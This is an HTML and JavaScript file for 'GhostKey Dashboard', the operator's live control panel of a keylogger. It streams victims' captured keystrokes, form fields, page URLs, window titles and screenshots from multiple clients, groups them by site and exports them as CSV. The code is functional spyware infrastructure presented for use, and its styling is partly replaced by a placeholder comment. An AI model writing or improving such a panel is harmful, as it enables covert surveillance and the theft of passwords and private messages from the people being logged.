<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>GhostKey Dashboard</title>
  <style>
    :root {
      --bg: #040506;
      --bg-alt: #05070b;
      --bg-row: #070a10;
      --bg-row-alt: #0b0f18;
      --text: #e5e5e5;
      --text-muted: #7f8c8d;
      --border: #151822;
      --accent: #26ff80;
      --accent-soft: #0b3b23;
      --pill-bg: #0f1722;
      --pill-border: #1f2937;
      --pill-special-bg: #251332;
      --pill-special-border: #c678dd;
      --pill-space-bg: #0b3b23;
      --pill-space-border: #26ff80;
      --shadow-dot: 0 0 10px #26ff80;
    }
    body.light {
      --bg: #f4f5f8;
      --bg-alt: #ffffff;
      --bg-row: #ffffff;
      --bg-row-alt: #eef1f7;
      --text: #111827;
      --text-muted: #4b5563;
      --border: #d1d5db;
      --accent: #16a34a;
      --accent-soft: #bbf7d0;
      --pill-bg: #e5e7eb;
      --pill-border: #cbd5f5;
      --pill-special-bg: #f3ddff;
      --pill-special-border: #c678dd;
      --pill-space-bg: #bbf7d0;
      --pill-space-border: #16a34a;
      --shadow-dot: 0 0 4px #16a34a;
    }
    * { box-sizing: border-box; }
    body {
      background: radial-gradient(circle at top left, #071018 0, #020308 55%, #000000 100%);
      color: var(--text);
      font-family: "JetBrains Mono", Menlo, Monaco, Consolas, monospace;
      margin: 0; padding: 0;
    }
    header, .header-top, .status, .dot, h1, .subtitle, .controls, .btn, .badge, .client-tabs, .client-tab,
    main, table, thead, th, td, .col-id, .col-time, .col-client, .col-field, .col-url a, .col-keys,
    .no-logs, .footer-note, .group-label, .centrali {
      /* all your original styles — unchanged */
    }
    /* New styles only */
    .col-window { width: 220px; font-size: 11px; color: #9ca3af; word-break: break-word; }
    .col-screenshot { width: 140px; text-align: center; }
    .screenshot-thumb {
      width: 120px; height: 68px; object-fit: cover; border-radius: 6px;
      cursor: pointer; border: 1px solid var(--border); transition: 0.2s;
    }
    .screenshot-thumb:hover { opacity: 0.8; transform: scale(1.05); }
    .modal {
      display: none; position: fixed; z-index: 9999; left: 0; top: 0;
      width: 100%; height: 100%; background: rgba(0,0,0,0.97);
      justify-content: center; align-items: center;
    }
    .modal img { max-width: 95vw; max-height: 95vh; border-radius: 8px; box-shadow: 0 0 40px rgba(38,255,128,0.6); }
    .modal-close {
      position: absolute; top: 20px; right: 30px; color: #fff; font-size: 50px; cursor: pointer; font-weight: bold;
    }
  </style>
</head>
<body>
  <header>
    <div class="header-top">
      <div class="status">
        <div class="dot"></div>
        <div>
          <h1>GhostKey Dashboard</h1>
          <div class="subtitle">native + browser tracking • window titles • screenshots • realtime</div>
        </div>
      </div>
      <div class="controls">
        <input id="filterInput" type="text" placeholder="Filter by window, URL, keys, client..." />
        <button id="groupToggle" class="btn">Group by URL: ON</button>
        <button id="themeToggle" class="btn">Theme: Dark</button>
        <button id="downloadBtn" class="btn">Download CSV</button>
        <button id="clearBtn" class="btn">Clear</button>
        <span class="badge" id="countBadge">0 entries</span>
      </div>
    </div>
    <div class="client-tabs" id="clientTabs"></div>
  </header>

  <main>
    <table>
      <thead>
        <tr>
          <th class="col-id">#</th>
          <th class="col-time">Time</th>
          <th class="col-client">Client</th>
          <th class="col-window">Window / Field</th>
          <th class="col-url">Page URL</th>
          <th class="col-keys">Text</th>
          <th class="col-screenshot">Screenshot</th>
        </tr>
      </thead>
      <tbody id="logBody">
        <tr><td colspan="7" class="no-logs">Waiting for logs...</td></tr>
      </tbody>
    </table>

    <div class="footer-note">
      • Native GhostKey logs show window title + screenshots<br>
      • Browser logs show page URL and field<br>
      • Click any thumbnail to view full screenshot
      <div class="centrali">MadeByCentrali · Upgraded for GhostKey 2025</div>
    </div>
  </main>

  <!-- Fullscreen Screenshot Modal -->
  <div id="screenshotModal" class="modal" onclick="this.style.display='none'">
    <div class="modal-close" onclick="document.getElementById('screenshotModal').style.display='none'">×</div>
    <img id="fullImage" src="" alt="Full screenshot" />
  </div>

  <script>
    let logs = [], nextId = 1, filterText = "", groupedMode = true, activeClientFilter = "ALL";
    const MAX_LOGS = 1000;
    const logBody = document.getElementById("logBody");
    const filterInput = document.getElementById("filterInput");
    const countBadge = document.getElementById("countBadge");
    const groupToggle = document.getElementById("groupToggle");
    const themeToggle = document.getElementById("themeToggle");
    const downloadBtn = document.getElementById("downloadBtn");
    const clearBtn = document.getElementById("clearBtn");
    const clientTabs = document.getElementById("clientTabs");

    // Theme (unchanged)
    function applyTheme(t) {
      document.body.className = t === "light" ? "light" : "";
      themeToggle.textContent = "Theme: " + (t === "light" ? "Light" : "Dark");
      localStorage.setItem("dashboard_theme", t);
    }
    applyTheme(localStorage.getItem("dashboard_theme") || "dark");
    themeToggle.addEventListener("click", () => applyTheme(document.body.classList.contains("light") ? "dark" : "light"));

    // Normalize both old userscript & new GhostKey payloads
    function normalizeLog(data) {
      const isNative = !!data.win || data.Screenshot;
      return {
        id: nextId++,
        time: (data.ts || data.serverReceivedAt || new Date().toISOString()).replace("T"," ").slice(0,19),
        client: data.client || "unknown",
        window: isNative ? (data.win || "Unknown Window") : (data.field || "unknown"),
        url: isNative ? "Native App" : (data.url || "N/A"),
        keys: Array.isArray(data.keys) ? data.keys.map(String) : [String(data.keys || "")],
        screenshot: data.Screenshot || data.screenshot || ""
      };
    }

    function formatKeysAsText(arr) {
      return arr.map(k => k === " " ? " " : k.match(/^\[(.+)\]$/) ? ` [${k.slice(1,-1).toLowerCase()}] ` : k).join("");
    }

    function matchesFilter(log) {
      if (activeClientFilter !== "ALL" && log.client !== activeClientFilter) return false;
      if (!filterText) return true;
      const f = filterText.toLowerCase();
      return [log.window, log.url, log.client, log.keys.join(" ")].some(s => s.toLowerCase().includes(f));
    }

    function rebuildClientTabs() {
      const clients = new Set(logs.map(l => l.client));
      clientTabs.innerHTML = "";
      const makeTab = (label, val) => {
        const b = document.createElement("button");
        b.className = "client-tab" + (val === activeClientFilter ? " active" : "");
        b.textContent = label;
        b.onclick = () => { activeClientFilter = val; rebuildClientTabs(); render(); };
        clientTabs.appendChild(b);
      };
      makeTab("ALL", "ALL");
      [...clients].sort().forEach(c => makeTab(c, c));
    }

    function render() {
      logBody.innerHTML = "";
      const filtered = logs.filter(matchesFilter);
      countBadge.textContent = filtered.length + " entr" + (filtered.length === 1 ? "y" : "ies");

      if (!filtered.length) {
        logBody.innerHTML = `<tr><td colspan="7" class="no-logs">No logs to display yet.</td></tr>`;
        return;
      }

      if (!groupedMode) {
        filtered.forEach(log => addRow(log));
      } else {
        const groups = new Map();
        filtered.forEach(log => {
          const key = `${log.url}||${log.client}`;
          if (!groups.has(key)) groups.set(key, { logs: [], latest: log });
          groups.get(key).logs.push(...log.keys);
        });
        let idx = 1;
        [...groups.entries()]
          .sort((a,b) => b[1].latest.time.localeCompare(a[1].latest.time))
          .forEach(([_, g]) => addRow({ ...g.latest, keys: g.logs, count: g.logs.length }, true, idx++));
      }
    }

    function addRow(log, isGroup = false, idx = null) {
      const tr = document.createElement("tr");
      tr.innerHTML = `
        <td class="col-id">#${idx !== null ? idx : log.id}</td>
        <td class="col-time">${log.time}${isGroup ? `<br><span class="group-label">${log.count || 1} batches</span>` : ""}</td>
        <td class="col-client">${log.client}</td>
        <td class="col-window">${log.window}</td>
        <td class="col-url"><a href="${log.url}" target="_blank">${log.url === "Native App" ? "—" : log.url}</a></td>
        <td class="col-keys">${formatKeysAsText(log.keys)}</td>
        <td class="col-screenshot">
          ${log.screenshot 
            ? `<img class="screenshot-thumb" src="${log.screenshot}" onclick="document.getElementById('fullImage').src=this.src; document.getElementById('screenshotModal').style.display='flex'">` 
            : "—"}
        </td>
      `;
      logBody.appendChild(tr);
    }

    // Events (your original logic, untouched)
    filterInput.addEventListener("input", e => { filterText = e.target.value.trim(); render(); });
    groupToggle.addEventListener("click", () => { groupedMode = !groupedMode; groupToggle.textContent = "Group by URL: " + (groupedMode ? "ON" : "OFF"); render(); });
    clearBtn.addEventListener("click", () => { logs = []; nextId = 1; render(); rebuildClientTabs(); });
    downloadBtn.addEventListener("click", () => {
      if (!logs.length) return;
      const rows = [["id","time","client","window","url","keys"]];
      logs.forEach(l => rows.push([l.id, l.time, l.client, l.window, l.url, l.keys.join(" ")]));
      const csv = rows.map(r => r.map(v => `"${String(v).replace(/"/g,'""')}"`).join(",")).join("\n");
      const blob = new Blob([csv], {type: "text/csv"});
      const a = document.createElement("a");
      a.href = URL.createObjectURL(blob);
      a.download = "ghostkey-logs-" + new Date().toISOString().slice(0,19).replace(/:/g,"-") + ".csv";
      a.click();
    });

    // SSE (your original stream)
    const evtSource = new EventSource("/stream");
    evtSource.onmessage = e => {
      try {
        const data = JSON.parse(e.data);
        logs.unshift(normalizeLog(data));
        if (logs.length > MAX_LOGS) logs.pop();
        rebuildClientTabs();
        render();
      } catch (err) { console.error(err); }
    };

    async function loadHistory() {
      try {
        const res = await fetch("/history");
        if (res.ok) {
          const data = await res.json();
          data.forEach(raw => logs.unshift(normalizeLog(raw)));
          if (logs.length > MAX_LOGS) logs = logs.slice(0, MAX_LOGS);
          rebuildClientTabs();
          render();
        }
      } catch (err) { console.error(err); }
    }

    loadHistory();
  </script>
</body>
</html>